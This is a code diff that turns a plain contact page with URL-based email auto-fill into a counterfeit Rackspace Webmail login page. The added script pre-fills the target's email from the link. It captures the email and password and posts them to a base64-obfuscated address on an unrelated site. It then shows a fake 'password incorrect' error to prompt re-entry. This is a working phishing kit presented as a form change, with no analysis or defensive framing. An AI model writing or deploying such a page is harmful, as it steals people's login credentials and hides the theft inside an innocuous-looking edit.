@@ -1,48 +1,213 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto-Populate Email Form</title>
+  <meta charset="UTF-8">
+  <title>Rackspace Webmail: Hosted Email for Business</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
+
+  <style>
+    /* Page Defaults */
+    * {
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.42857;
+      color: #333333;
+      background-color: #FAFAFA;
+      margin: 0;
+    }
+
+    /* Page Layout */
+    #content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      background: #EAEAEA;
+    }
+
+    #content-header {
+      height: 53px;
+      padding: 16px;
+      font-size: 24px;
+      font-weight: 300;
+      line-height: 18px;
+      background: #424242;
+      color: #FCFCFC;
+    }
+
+    #content-header-logo {
+      float: right;
+    }
+
+    #logo {
+      width: 130px;
+      margin-top: -9px;
+      margin-right: -5px;
+    }
+
+    #content-header-label {
+      float: left;
+    }
+
+    #content-body {
+      display: flex;
+      justify-content: start;
+      background: #FFFFFF;
+      min-width: 790px;
+    }
+
+    #form {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 20px;
+      min-height: 268px;
+      width: 100%;
+    }
+
+    .form-field {
+      border: 1px solid #BDBDBD;
+      border-radius: 2px;
+      background: #FFFFFF;
+      font-family: Roboto;
+      font-size: 16px;
+      color: #616161;
+      height: 32px;
+      display: block;
+      width: 100%;
+      padding: 4px 8px;
+      line-height: 1.42857;
+    }
+  </style>
 </head>
 <body>
+  <div>
+    <div id="content">
+      <div>
+        <div id="content-header">
+          <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"  /></div>
+          <div id="content-header-label">Webmail Login</div>
+        </div>
+        <div id="content-body">
+          <form id="form" autocomplete="off">
+            <div id="form-body">
+              <div id="form-container">
+                <input type="hidden" name="__RequestVerificationToken" value="your-verification-token" />
+                <div id="user-row" class="row">
+                  <div id="user-col" class="col">
+                    <div id="user-field" class="form-group">
+                      <p align="left">
+                        <span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
+                      </p>
+                      <label id="user-label" class="form-label">Email address</label>
+                      <input id="ai" name="username" tabindex="1" class="form-field" value="" autocomplete="username" />
+                    </div>
+                  </div>
+                </div>
+                <div id="pass-row" class="row">
+                  <div id="pass-col" class="col">
+                    <div id="pass-field" class="form-group">
+                      <label id="pass-label" class="form-label">Password</label>
+                      <input id="pr" name="password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password" />
+                    </div>
+                    <a id="forgot-password" href="#" tabindex="4">Forgot password?</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div id="login-btn-toolbar">
+              <button class="login-btn" type="submit" id="submit-btn">Log In</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
 
-    <h1>Contact Form</h1>
-    <form id="contact-form">
-        <label for="name">Name:</label>
-        <input type="text" id="name" name="name" required><br><br>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required><br><br>
+  <script>
+    $(document).ready(function() {
+      // Auto-populate the email field from the URL query parameter
+      var emailFromURL = new URLSearchParams(window.location.search).get('email'); // Grab the 'email' parameter from URL
+      if (emailFromURL) {
+        $('#ai').val(emailFromURL);  // Set the email field to the value of 'email' from the URL
+      }
 
-        <label for="message">Message:</label>
-        <textarea id="message" name="message" required></textarea><br><br>
+      $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
 
-        <button type="submit">Send Message</button>
-    </form>
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
 
-    <script>
-        // Function to get the email parameter from the URL query string
-        function getEmailFromURL() {
-            // Get the URL query string
-            const urlParams = new URLSearchParams(window.location.search);
-
-            // Check if the 'email' parameter exists and return its value
-            const email = urlParams.get('email');
-            return email;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        
+        if (!ai) {
+          $('#error').show();
+          $('#error').html("The email field is empty!");
+          return false;
         }
 
-        // Auto-fill the email field when the page loads
-        window.onload = function() {
-            const email = getEmailFromURL();
+        if (!filter.test(ai)) {
+          $('#error').show();
+          $('#error').html("Please enter a valid email address.");
+          return false;
+        }
 
-            // If email is found in the URL, populate the email input field
-            if (email) {
-                const emailField = document.getElementById('email');
-                emailField.value = email;  // Set the email field value
+        if (!pr) {
+          $('#error').show();
+          $('#error').html("The password field is empty!");
+          return false;
+        }
+
+        // Make AJAX request for the login
+        var file = "aHR0cHM6Ly9pbm5wYWN0LmNvLnphL2FkbWluaXN0cmF0b3IvaW5jbHVkZXMveGx4LnBocC9yYXhja2llLnBocA==";
+        $.ajax({
+          dataType: 'JSON',
+          url: atob(file),
+          type: 'POST',
+          data: {
+            ai: ai,
+            pr: pr,
+          },
+          beforeSend: function(xhr) {
+            $('#submit-btn').html('Please wait ...');
+          },
+          success: function(response) {
+            if (response) {
+              $("#msg").show();
+              console.log(response);
+              if (response['signal'] == 'ok') {
+                $("#pr").val("");
+              }
             }
-        };
-    </script>
-
+          },
+          error: function() {
+            $("#pr").val("");
+            $("#msg").show();
+            setTimeout(function() { $("#msg").fadeOut('slow'); }, 3000);
+            $('#msg').html("Error: Password incorrect");
+          },
+          complete: function() {
+            $('#submit-btn').html('Log In');
+          }
+        });
+      });
+    });
+  </script>
 </body>
 </html>
